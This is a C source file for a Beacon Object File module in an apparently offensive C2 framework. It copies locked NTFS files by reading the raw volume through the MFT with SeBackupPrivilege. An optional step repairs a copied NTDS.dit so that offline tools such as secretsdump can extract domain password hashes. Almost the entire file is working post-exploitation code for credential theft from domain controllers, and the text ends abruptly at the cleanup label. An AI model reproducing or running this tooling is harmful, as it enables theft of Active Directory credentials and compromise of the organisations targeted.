/*
 * underlaycopy.c — copy a locked NTFS file by reading it directly out
 * of the volume via the MFT, bypassing normal file-lock semantics.
 *
 * Original technique / reference implementation:
 *   Muz1K1zuM / UnderlayCopy_bof  (adapted here to the calabasas-c2
 *   BOF conventions: beacon_compat.h, MSVCRT$/KERNEL32$ imports, module.yaml,
 *   configurable source volume, no unused/uninitialized warnings).
 *
 * How it works:
 *   1. Enable SeBackupPrivilege on the current thread token.
 *   2. CreateFileW(source, FILE_READ_ATTRIBUTES, …) to learn the
 *      source's MFT record number and file size — this succeeds even
 *      when a normal read would be denied because we're only asking
 *      for attributes.
 *   3. Open the raw volume (\\.\<drive>:) with GENERIC_READ.
 *   4. Parse boot sector → bytes-per-sector, sectors-per-cluster,
 *      $MFT cluster.
 *   5. Read $MFT record 0 (the $MFT's own record) at (mftCluster *
 *      clusterSize) and parse ITS $DATA (attr 0x80) data runs, because
 *      on real disks the $MFT is fragmented and you cannot compute a
 *      target record's disk offset as a linear mftBase + rec*1024.
 *   6. Use the $MFT's own runs to translate the target's MFT record
 *      number → a real byte offset on disk, then read that record.
 *   7. Parse the target record's $DATA attribute: if resident, copy
 *      inline bytes; if non-resident, walk its data runs and stream
 *      clusters straight from the volume into the destination file.
 *
 * Required privileges: SeBackupPrivilege (typically Administrators,
 * SYSTEM, or Backup Operators).
 *
 * Win32 APIs: kernel32, advapi32, ntdll, esent (no CRT needed).
 */
#include <windows.h>
#include "beacon_compat.h"

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#define MFT_RECORD_SIZE 1024
#define CHUNK_SIZE      (512 * 1024)
#define MAX_RUNS        256

/* JET (ESE) types — enough to call the repair functions without the
 * full esent.h header (which MinGW doesn't ship). */
typedef unsigned long long JET_API_PTR;
typedef JET_API_PTR        JET_INSTANCE;
typedef JET_API_PTR        JET_SESID;
typedef long               JET_ERR;

/* JET system parameter IDs (from esent.h) */
#define JET_paramSystemPath         0
#define JET_paramTempPath           1
#define JET_paramLogFilePath        2
#define JET_paramBaseName           3
#define JET_paramMaxOpenTables      6
#define JET_paramCircularLog        17
#define JET_paramRecovery           34
#define JET_paramDatabasePageSize   64

/* JET_GRBIT flags */
#define JET_bitTermComplete         0x00000001
#define JET_bitTermDirty            0x00000008
#define JET_bitDbDeleteCorruptIndexes 0x00000010

/* JET error codes */
#define JET_errDatabaseDirtyShutdown (-550)
#define JET_errSuccess               0

/* ─── Imports ─────────────────────────────────────────────────────── */

DECLSPEC_IMPORT BOOL     WINAPI ADVAPI32$LookupPrivilegeValueW(LPCWSTR, LPCWSTR, PLUID);
DECLSPEC_IMPORT NTSTATUS NTAPI  NTDLL$NtOpenProcessToken(HANDLE, ACCESS_MASK, PHANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI  NTDLL$NtAdjustPrivilegesToken(HANDLE, BOOLEAN, PVOID, ULONG, PVOID, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI  NTDLL$NtClose(HANDLE);

DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$GetFileInformationByHandle(HANDLE, LPBY_HANDLE_FILE_INFORMATION);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$GetProcessHeap(VOID);
DECLSPEC_IMPORT LPVOID   WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT int      WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$SetFilePointer(HANDLE, LONG, PLONG, DWORD);

/* esent.dll — ESE database engine (present on every Windows since XP).
 * Used to repair NTDS.dit after raw MFT copy leaves it in dirty
 * shutdown state. */
DECLSPEC_IMPORT JET_ERR __stdcall ESENT$JetCreateInstance2W(JET_INSTANCE*, const wchar_t*, const wchar_t*, unsigned long);
DECLSPEC_IMPORT JET_ERR __stdcall ESENT$JetSetSystemParameterW(JET_INSTANCE*, JET_SESID, unsigned long, JET_API_PTR, const wchar_t*);
DECLSPEC_IMPORT JET_ERR __stdcall ESENT$JetInit(JET_INSTANCE*);
DECLSPEC_IMPORT JET_ERR __stdcall ESENT$JetBeginSessionW(JET_INSTANCE, JET_SESID*, const wchar_t*, const wchar_t*);
DECLSPEC_IMPORT JET_ERR __stdcall ESENT$JetAttachDatabase2W(JET_SESID, const wchar_t*, unsigned long, unsigned long);
DECLSPEC_IMPORT JET_ERR __stdcall ESENT$JetDetachDatabase2W(JET_SESID, const wchar_t*, unsigned long);
DECLSPEC_IMPORT JET_ERR __stdcall ESENT$JetEndSession(JET_SESID, unsigned long);
DECLSPEC_IMPORT JET_ERR __stdcall ESENT$JetTerm2(JET_INSTANCE, unsigned long);

/* ─── Helpers ─────────────────────────────────────────────────────── */

static BOOL EnablePriv(const wchar_t *name)
{
    HANDLE hToken = NULL;
    NTSTATUS st = NTDLL$NtOpenProcessToken(
        (HANDLE)(LONG_PTR)(-1),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    if (!NT_SUCCESS(st)) return FALSE;
    struct { DWORD Count; LUID_AND_ATTRIBUTES Priv[1]; } tp;
    tp.Count = 1;
    tp.Priv[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ok = ADVAPI32$LookupPrivilegeValueW(NULL, name, &tp.Priv[0].Luid);
    if (ok) NTDLL$NtAdjustPrivilegesToken(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    NTDLL$NtClose(hToken);
    return ok;
}

/* Synchronous seek+read loop matching the reference PS1 semantics. */
static BOOL SeekAndRead(HANDLE h, LONGLONG offset, BYTE *buf, DWORD size)
{
    LONG lo = (LONG)(offset & 0xFFFFFFFF);
    LONG hi = (LONG)((ULONGLONG)offset >> 32);
    DWORD r = KERNEL32$SetFilePointer(h, lo, &hi, FILE_BEGIN);
    if (r == INVALID_SET_FILE_POINTER && KERNEL32$GetLastError() != NO_ERROR)
        return FALSE;
    DWORD total = 0;
    while (total < size) {
        DWORD rd = 0;
        if (!KERNEL32$ReadFile(h, buf + total, size - total, &rd, NULL) || rd == 0)
            return FALSE;
        total += rd;
    }
    return TRUE;
}

/* ─── Data runs parser ────────────────────────────────────────────── */

typedef struct { LONGLONG Lcn; LONGLONG LengthClusters; } DataRun;

static int ParseDataRuns(BYTE *data, int dataLen, DataRun *runs, int maxRuns)
{
    int pos = 0, count = 0;
    LONGLONG curLcn = 0;
    while (pos < dataLen && data[pos] != 0x00 && count < maxRuns) {
        BYTE hdr     = data[pos++];
        int  lenSize = hdr & 0x0F;
        int  offSize = (hdr >> 4) & 0x0F;
        LONGLONG length = 0;
        for (int i = 0; i < lenSize; i++)
            length |= ((LONGLONG)data[pos++]) << (8 * i);
        LONGLONG offset = 0;
        if (offSize > 0) {
            for (int i = 0; i < offSize; i++)
                offset |= ((LONGLONG)data[pos++]) << (8 * i);
            /* Sign-extend a negative offset (VCN went backwards). Do
             * the shift on an UNSIGNED value; shifting a signed -1 is
             * UB per the C standard even though the result would be
             * what we want here. */
            if (data[pos - 1] & 0x80) {
                ULONGLONG umask = ~0ULL << (8 * offSize);
                offset |= (LONGLONG)umask;
            }
        }
        curLcn += offset;
        runs[count].Lcn            = curLcn;
        runs[count].LengthClusters = length;
        count++;
    }
    return count;
}

/* Apply NTFS Update Sequence Array (USA) fixup to an MFT record.
 *
 * NTFS protects multi-sector structures against torn writes by replacing
 * the last 2 bytes of every sector with a check value.  The original
 * bytes are saved in a small array (the USA) inside the record header.
 *
 * Without this fixup, any attribute data that happens to span bytes
 * 510-511 or 1022-1023 of the MFT record will contain the check value
 * instead of the real data — silently corrupting data run parsing and
 * producing a broken file copy. */
static BOOL ApplyUSAFixup(BYTE *record, DWORD recordSize, WORD sectorSize)
{
    /* Header offsets 4-5 = USA offset, 6-7 = USA size (in WORDs,
     * including the check value itself). */
    WORD usaOffset = (WORD)(record[4] | ((WORD)record[5] << 8));
    WORD usaCount  = (WORD)(record[6] | ((WORD)record[7] << 8));

    if (usaCount < 2)
        return TRUE;   /* nothing to fix — shouldn't happen for FILE records */
    if ((DWORD)usaOffset + (DWORD)usaCount * 2 > recordSize)
        return FALSE;  /* USA extends past the record */

    WORD checkVal = (WORD)(record[usaOffset] |
                           ((WORD)record[usaOffset + 1] << 8));

    for (WORD i = 1; i < usaCount; i++) {
        DWORD pos = (DWORD)i * sectorSize - 2;   /* last 2 bytes of sector i */
        if (pos + 2 > recordSize)
            break;

        /* Verify the check value was written at the sector boundary. */
        WORD sectorVal = (WORD)(record[pos] | ((WORD)record[pos + 1] << 8));
        if (sectorVal != checkVal)
            return FALSE;   /* torn write or corrupt record */

        /* Restore the original 2 bytes from the USA entry. */
        DWORD usaIdx = usaOffset + (DWORD)i * 2;
        record[pos]     = record[usaIdx];
        record[pos + 1] = record[usaIdx + 1];
    }
    return TRUE;
}

/* ─── ESE repair ─────────────────────────────────────────────────── */

/* Detect ESE page size from the database header (offset 0xEC in page 0).
 * Falls back to 8192 if the file can't be read. */
static DWORD DetectEsePageSize(const wchar_t *dbPath)
{
    HANDLE h = KERNEL32$CreateFileW(dbPath, GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return 8192;
    BYTE hdr[256] = {0};
    DWORD rd = 0;
    KERNEL32$ReadFile(h, hdr, 256, &rd, NULL);
    KERNEL32$CloseHandle(h);
    if (rd < 0xF0) return 8192;
    DWORD pgSz = (DWORD)(hdr[0xEC] | (hdr[0xED] << 8) |
                          (hdr[0xEE] << 16) | (hdr[0xEF] << 24));
    /* Sanity: valid ESE page sizes are 4096, 8192, 16384, 32768. */
    if (pgSz != 4096 && pgSz != 8192 && pgSz != 16384 && pgSz != 32768)
        pgSz = 8192;
    return pgSz;
}

/* Repair a dirty ESE database (.dit / .edb) in-process via esent.dll.
 *
 * NTDS.dit is always in "dirty shutdown" state when copied from a live
 * DC because AD hasn't flushed its transaction logs.  Without repair,
 * offline parsers like impacket-secretsdump fail with index errors.
 *
 * Strategy (two-phase):
 *   Phase 1 — JET recovery:
 *     Create a JET instance with recovery ON, circular logging, and
 *     log/checkpoint paths pointing to the copied database's directory.
 *     JetAttachDatabase2W triggers the engine to create new recovery
 *     logs and bring the database to clean shutdown state.
 *   Phase 2 — header patch (fallback):
 *     If JET recovery fails (missing log generation, version mismatch,
 *     etc.), directly patch the ESE header's dbstate DWORD at offset
 *     0xD4 from DirtyShutdown (2) to CleanShutdown (3).  This lets
 *     offline parsers proceed; uncommitted pages may cause sporadic
 *     errors on individual records but the bulk of hashes will parse. */
static void RepairEseDatabase(const wchar_t *dbPath, HANDLE heap)
{
    DWORD pgSz = DetectEsePageSize(dbPath);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] ESE page size: %lu", pgSz);

    JET_INSTANCE inst = 0;
    JET_SESID    ses  = 0;
    JET_ERR      err;

    /* Build a temp path for recovery logs: same directory as the
     * database file.  E.g.  C:\ntds.bin  →  C:\ */
    wchar_t logPath[512] = {0};
    int pathLen = 0;
    for (int i = 0; dbPath[i]; i++) pathLen = i + 1;
    /* Copy full path, then truncate after last backslash. */
    for (int i = 0; i < pathLen && i < 510; i++) logPath[i] = dbPath[i];
    for (int i = pathLen - 1; i >= 0; i--) {
        if (logPath[i] == L'\\' || logPath[i] == L'/') {
            logPath[i + 1] = L'\0';
            break;
        }
    }

    /* Instance name — just needs to be unique. */
    wchar_t instName[] = {L'u',L'l',L'c',L'r',L'e',L'p',L'\0'};
    err = ESENT$JetCreateInstance2W(&inst, instName, NULL, 0);
    if (err != JET_errSuccess) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] JetCreateInstance2W: %ld", err);
        return;
    }

    /* Page size MUST match the database — set before JetInit. */
    ESENT$JetSetSystemParameterW(&inst, 0, JET_paramDatabasePageSize,
                                  (JET_API_PTR)pgSz, NULL);

    /* Point recovery logs/checkpoint to the same directory as the
     * copied database so we don't touch the live AD log path. */
    ESENT$JetSetSystemParameterW(&inst, 0, JET_paramSystemPath,   0, logPath);
    ESENT$JetSetSystemParameterW(&inst, 0, JET_paramTempPath,     0, logPath);
    ESENT$JetSetSystemParameterW(&inst, 0, JET_paramLogFilePath,  0, logPath);

    /* Base name "edb" matches the log files NTDS.dit expects
     * (edb.log, edb00001.log, edb.chk, etc.). */
    wchar_t baseName[] = {L'e',L'd',L'b',L'\0'};
    ESENT$JetSetSystemParameterW(&inst, 0, JET_paramBaseName, 0, baseName);

    /* Enable recovery so the engine can replay/create logs to fix the
     * dirty shutdown state.  The logs go to our temp directory, not
     * the live AD path. */
    wchar_t recOn[] = {L'o',L'n',L'\0'};
    ESENT$JetSetSystemParameterW(&inst, 0, JET_paramRecovery, 0, recOn);

    /* Circular logging: engine creates new log files instead of failing
     * when the expected sequential log generation doesn't exist. */
    ESENT$JetSetSystemParameterW(&inst, 0, JET_paramCircularLog, 1, NULL);

    ESENT$JetSetSystemParameterW(&inst, 0, JET_paramMaxOpenTables, 1000, NULL);

    err = ESENT$JetInit(&inst);
    if (err != JET_errSuccess) {
        BeaconPrintf(CALLBACK_ERROR, "[-] JetInit: %ld", err);
        ESENT$JetTerm2(inst, JET_bitTermComplete);
        return;
    }

    err = ESENT$JetBeginSessionW(inst, &ses, NULL, NULL);
    if (err != JET_errSuccess) {
        BeaconPrintf(CALLBACK_ERROR, "[-] JetBeginSession: %ld", err);
        ESENT$JetTerm2(inst, JET_bitTermComplete);
        return;
    }

    /* Attach — the engine will create recovery logs in logPath and
     * bring the database to a clean shutdown state. */
    err = ESENT$JetAttachDatabase2W(ses, dbPath, 0, 0);
    if (err == JET_errSuccess) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] ESE attach OK — database repaired");
        ESENT$JetDetachDatabase2W(ses, dbPath, 0);
    } else {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] JetAttachDatabase2W: %ld — trying header patch fallback", err);
    }

    ESENT$JetEndSession(ses, 0);
    ESENT$JetTerm2(inst, JET_bitTermComplete);

    /* Fallback: if JET recovery failed (e.g. missing log files), directly
     * patch the database header's dbstate from DirtyShutdown (2) to
     * CleanShutdown (3).  This is the same trick esentutl uses internally.
     * Offset 0xD4 in the ESE header holds the JET_dbstate DWORD. */
    if (err != JET_errSuccess) {
        HANDLE hDb = KERNEL32$CreateFileW(dbPath,
            GENERIC_READ | GENERIC_WRITE,
            0, NULL, OPEN_EXISTING, 0, NULL);
        if (hDb != INVALID_HANDLE_VALUE) {
            BYTE hdr[256] = {0};
            DWORD rd = 0;
            KERNEL32$ReadFile(hDb, hdr, 256, &rd, NULL);
            if (rd >= 0xD8) {
                DWORD dbState = (DWORD)(hdr[0xD4] | (hdr[0xD5] << 8) |
                                        (hdr[0xD6] << 16) | (hdr[0xD7] << 24));
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[*] current dbstate: %lu (2=dirty, 3=clean)", dbState);
                if (dbState == 2) {
                    /* Set to CleanShutdown (3). */
                    hdr[0xD4] = 3; hdr[0xD5] = 0;
                    hdr[0xD6] = 0; hdr[0xD7] = 0;
                    LONG zero = 0;
                    KERNEL32$SetFilePointer(hDb, 0, &zero, FILE_BEGIN);
                    DWORD wr = 0;
                    KERNEL32$WriteFile(hDb, hdr, 256, &wr, NULL);
                    BeaconPrintf(CALLBACK_OUTPUT,
                        "[+] patched dbstate 2 -> 3 (clean shutdown)");
                }
            }
            KERNEL32$CloseHandle(hDb);
        }
    }
}

/* Build the raw volume path L"\\.\<drive>:" for CreateFileW. */
static void BuildVolumePath(char drive, wchar_t out[7])
{
    out[0] = L'\\';
    out[1] = L'\\';
    out[2] = L'.';
    out[3] = L'\\';
    out[4] = (wchar_t)(drive >= 'a' && drive <= 'z'
                       ? drive - ('a' - 'A') : drive);
    out[5] = L':';
    out[6] = L'\0';
}

/* ─── Entry point ─────────────────────────────────────────────────── */

void go(char *args, int len)
{
    HANDLE heap = KERNEL32$GetProcessHeap();

    datap parser;
    BeaconDataParse(&parser, args, len);
    char *srcA   = BeaconDataExtract(&parser, NULL);
    char *dstA   = BeaconDataExtract(&parser, NULL);
    char *volA   = BeaconDataExtract(&parser, NULL);
    int   repair = BeaconDataInt(&parser);

    if (!srcA || !dstA || !srcA[0] || !dstA[0]) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] usage: underlaycopy --src <path> --dst <path> [--volume C] [--repair 1]");
        return;
    }
    char volDrive = (volA && volA[0]) ? volA[0] : 'C';

    BeaconPrintf(CALLBACK_OUTPUT, "[*] src: %s",   srcA);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] dst: %s",   dstA);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] vol: %c:", volDrive);

    /* Allocate everything up front so the single cleanup label can
     * unconditionally free them; the reference implementation had an
     * -Wmaybe-uninitialized on mftRuns because it was allocated late. */
    wchar_t *srcW    = (wchar_t*)KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, 1024 * 2);
    wchar_t *dstW    = (wchar_t*)KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, 1024 * 2);
    BYTE    *mftRec  = (BYTE*)   KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, MFT_RECORD_SIZE);
    BYTE    *mftSelf = (BYTE*)   KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, MFT_RECORD_SIZE);
    BYTE    *chunk   = (BYTE*)   KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, CHUNK_SIZE);
    DataRun *runs    = (DataRun*)KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, MAX_RUNS * sizeof(DataRun));
    DataRun *mftRuns = (DataRun*)KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, MAX_RUNS * sizeof(DataRun));
    HANDLE   hVol    = INVALID_HANDLE_VALUE;
    HANDLE   hDst    = INVALID_HANDLE_VALUE;

    if (!srcW || !dstW || !mftRec || !mftSelf || !chunk || !runs || !mftRuns) {
        BeaconPrintf(CALLBACK_ERROR, "[-] HeapAlloc failed");
        goto cleanup;
    }

    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, srcA, -1, srcW, 1024);
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, dstA, -1, dstW, 1024);

    /* 1. SeBackupPrivilege — needed to open FILE_READ_ATTRIBUTES on the
     *    target without a real read grant, and to open the raw volume. */
    wchar_t seBackup[] = {L'S',L'e',L'B',L'a',L'c',L'k',L'u',L'p',
                          L'P',L'r',L'i',L'v',L'i',L'l',L'e',L'g',L'e',L'\0'};
    if (!EnablePriv(seBackup)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] SeBackupPrivilege failed");
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] SeBackupPrivilege enabled");

    /* 2. Pull the source's MFT record number + logical size via a
     *    metadata-only open — permitted even on locked hives. */
    HANDLE hSrc = KERNEL32$CreateFileW(srcW,
        FILE_READ_ATTRIBUTES,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hSrc == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Open src attrs failed: %lu", KERNEL32$GetLastError());
        goto cleanup;
    }
    BY_HANDLE_FILE_INFORMATION fi = {0};
    KERNEL32$GetFileInformationByHandle(hSrc, &fi);
    KERNEL32$CloseHandle(hSrc);

    ULONGLONG frn   = ((ULONGLONG)fi.nFileIndexHigh << 32) | fi.nFileIndexLow;
    DWORD mftRecNum = (DWORD)(frn & 0x0000FFFFFFFFFFFF);
    LONGLONG fsize  = ((LONGLONG)fi.nFileSizeHigh << 32) | fi.nFileSizeLow;
    BeaconPrintf(CALLBACK_OUTPUT, "[*] MFT#%lu size:%lld", mftRecNum, fsize);

    /* 3. Open raw volume. Sync I/O with no OVERLAPPED — matches the
     *    reference PS1 behavior exactly. */
    wchar_t vol[7];
    BuildVolumePath(volDrive, vol);
    hVol = KERNEL32$CreateFileW(vol,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL);
    if (hVol == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Open volume %c: failed: %lu",
            volDrive, KERNEL32$GetLastError());
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Volume %c: opened", volDrive);

    /* 4. Boot sector → geometry. */
    BYTE boot[512] = {0};
    if (!SeekAndRead(hVol, 0, boot, 512)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Boot read failed: %lu", KERNEL32$GetLastError());
        goto cleanup;
    }
    WORD     bps  = (WORD)(boot[11] | ((WORD)boot[12] << 8));
    BYTE     spc  = boot[13];
    LONGLONG csz  = (LONGLONG)bps * spc;
    LONGLONG mftC = 0;
    for (int i = 0; i < 8; i++)
        mftC |= ((LONGLONG)boot[48 + i]) << (8 * i);
    LONGLONG mftOff = mftC * csz;
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] bps:%u spc:%u csz:%lld mftC:%lld mftOff:%lld",
        bps, spc, csz, mftC, mftOff);

    /* 5. Read $MFT record 0 and extract its own data runs — the MFT
     *    itself is fragmented on real disks, so we cannot compute
     *    target record offset as mftOff + rec*1024. */
    if (!SeekAndRead(hVol, mftOff, mftSelf, MFT_RECORD_SIZE)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] $MFT record 0 read failed: %lu", KERNEL32$GetLastError());
        goto cleanup;
    }
    if (mftSelf[0] != 'F' || mftSelf[1] != 'I' ||
        mftSelf[2] != 'L' || mftSelf[3] != 'E') {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid $MFT signature");
        goto cleanup;
    }
    if (!ApplyUSAFixup(mftSelf, MFT_RECORD_SIZE, bps)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] $MFT USA fixup failed (torn write?)");
        goto cleanup;
    }
    int mftRunCnt = 0;
    WORD mftAttrOff = (WORD)(mftSelf[20] | ((WORD)mftSelf[21] << 8));
    while (mftAttrOff + 4 < MFT_RECORD_SIZE) {
        DWORD type = (DWORD)(mftSelf[mftAttrOff]|(mftSelf[mftAttrOff+1]<<8)|
                             (mftSelf[mftAttrOff+2]<<16)|(mftSelf[mftAttrOff+3]<<24));
        if (type == 0xFFFFFFFF) break;
        DWORD alen = (DWORD)(mftSelf[mftAttrOff+4]|(mftSelf[mftAttrOff+5]<<8)|
                             (mftSelf[mftAttrOff+6]<<16)|(mftSelf[mftAttrOff+7]<<24));
        if (alen == 0 || mftAttrOff + alen > MFT_RECORD_SIZE) break;

        /* attr 0x80 = $DATA; non-resident bit = mftSelf[off+8] */
        if (type == 0x80 && mftSelf[mftAttrOff + 8] != 0) {
            WORD roff = (WORD)(mftSelf[mftAttrOff+32]|(mftSelf[mftAttrOff+33]<<8));
            mftRunCnt = ParseDataRuns(mftSelf + mftAttrOff + roff,
                                      (int)(alen - roff), mftRuns, MAX_RUNS);
            break;
        }
        mftAttrOff += (WORD)alen;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] $MFT runs: %d", mftRunCnt);
    if (mftRunCnt == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] $MFT has no non-resident $DATA");
        goto cleanup;
    }

    /* 6. Translate target MFT record number → real disk offset via the
     *    $MFT's runs. Multiple records live per cluster on modern
     *    Windows (csz / 1024). */
    LONGLONG recsPerCluster  = csz / MFT_RECORD_SIZE;
    LONGLONG targetCluster   = (LONGLONG)mftRecNum / recsPerCluster;
    LONGLONG offsetInCluster = ((LONGLONG)mftRecNum % recsPerCluster) * MFT_RECORD_SIZE;

    LONGLONG recOff = -1;
    LONGLONG vcn = 0;
    for (int i = 0; i < mftRunCnt; i++) {
        LONGLONG runLen = mftRuns[i].LengthClusters;
        if (targetCluster >= vcn && targetCluster < vcn + runLen) {
            LONGLONG clusterInRun = targetCluster - vcn;
            recOff = mftRuns[i].Lcn * csz + clusterInRun * csz + offsetInCluster;
            break;
        }
        vcn += runLen;
    }
    if (recOff < 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] MFT record %lu not found in $MFT runs", mftRecNum);
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] target record offset: %lld", recOff);

    if (!SeekAndRead(hVol, recOff, mftRec, MFT_RECORD_SIZE)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] target MFT read failed: %lu", KERNEL32$GetLastError());
        goto cleanup;
    }
    if (mftRec[0] != 'F' || mftRec[1] != 'I' ||
        mftRec[2] != 'L' || mftRec[3] != 'E') {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid target MFT signature");
        goto cleanup;
    }
    if (!ApplyUSAFixup(mftRec, MFT_RECORD_SIZE, bps)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] target MFT USA fixup failed (torn write?)");
        goto cleanup;
    }

    /* 7. Parse target's $DATA attribute — resident or non-resident. */
    WORD  attrOff  = (WORD)(mftRec[20] | ((WORD)mftRec[21] << 8));
    int   runCount = 0;
    BOOL  resident = FALSE;
    BYTE *resData  = NULL;
    DWORD resSize  = 0;
    while (attrOff + 4 < MFT_RECORD_SIZE) {
        DWORD type = (DWORD)(mftRec[attrOff]|(mftRec[attrOff+1]<<8)|
                             (mftRec[attrOff+2]<<16)|(mftRec[attrOff+3]<<24));
        if (type == 0xFFFFFFFF) break;
        DWORD alen = (DWORD)(mftRec[attrOff+4]|(mftRec[attrOff+5]<<8)|
                             (mftRec[attrOff+6]<<16)|(mftRec[attrOff+7]<<24));
        if (alen == 0 || attrOff + alen > MFT_RECORD_SIZE) break;
        BYTE nonRes = mftRec[attrOff + 8];

        if (type == 0x80) {
            if (nonRes == 0) {
                resident = TRUE;
                resSize  = (DWORD)(mftRec[attrOff+16]|(mftRec[attrOff+17]<<8)|
                                   (mftRec[attrOff+18]<<16)|(mftRec[attrOff+19]<<24));
                WORD voff = (WORD)(mftRec[attrOff+20]|(mftRec[attrOff+21]<<8));
                resData   = mftRec + attrOff + voff;
            } else {
                WORD roff = (WORD)(mftRec[attrOff+32]|(mftRec[attrOff+33]<<8));
                runCount  = ParseDataRuns(mftRec + attrOff + roff,
                                          (int)(alen - roff), runs, MAX_RUNS);
            }
            break;
        }
        attrOff += (WORD)alen;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] $DATA: runs=%d resident=%d", runCount, resident);

    /* 8. Destination — CREATE_ALWAYS, normal file semantics. */
    hDst = KERNEL32$CreateFileW(dstW, GENERIC_WRITE, 0, NULL,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDst == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Open dst failed: %lu", KERNEL32$GetLastError());
        goto cleanup;
    }

    /* 9. Copy — resident inline, non-resident stream by data runs. */
    BOOL ok = TRUE;
    if (resident) {
        DWORD w = 0;
        ok = KERNEL32$WriteFile(hDst, resData, resSize, &w, NULL);
    } else {
        LONGLONG rem = fsize;
        for (int i = 0; i < runCount && rem > 0 && ok; i++) {
            LONGLONG extBytes = runs[i].LengthClusters * csz;
            LONGLONG toCopy   = extBytes < rem ? extBytes : rem;
            LONGLONG diskOff  = runs[i].Lcn * csz;
            LONGLONG copied   = 0;
            while (copied < toCopy && ok) {
                DWORD blk = (DWORD)((toCopy - copied) < CHUNK_SIZE
                                    ? (toCopy - copied) : CHUNK_SIZE);
                if (!SeekAndRead(hVol, diskOff + copied, chunk, blk)) {
                    BeaconPrintf(CALLBACK_ERROR,
                        "[-] read chunk failed run:%d err:%lu",
                        i, KERNEL32$GetLastError());
                    ok = FALSE; break;
                }
                DWORD w = 0;
                if (!KERNEL32$WriteFile(hDst, chunk, blk, &w, NULL) || w != blk) {
                    BeaconPrintf(CALLBACK_ERROR,
                        "[-] write chunk failed run:%d", i);
                    ok = FALSE; break;
                }
                copied += blk;
            }
            rem -= toCopy;
        }
    }

    if (ok)
        BeaconPrintf(CALLBACK_OUTPUT, "[+] done — %lld bytes -> %s", fsize, dstA);
    else
        BeaconPrintf(CALLBACK_ERROR,  "[-] copy incomplete");

    /* 10. Optional ESE repair — NTDS.dit copied from a live DC is always
     *     in dirty shutdown state.  Use esent.dll to attach+detach which
     *     replays/creates recovery logs and brings it to clean state. */
    if (ok && repair) {
        /* Close dst handle first — esent needs exclusive access. */
        if (hDst != INVALID_HANDLE_VALUE) {
            KERNEL32$CloseHandle(hDst);
            hDst = INVALID_HANDLE_VALUE;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[*] repairing ESE database...");
        RepairEseDatabase(dstW, heap);
    }

cleanup:
    if (hDst    != INVALID_HANDLE_VALUE) KERNEL32$CloseHandle(hDst);
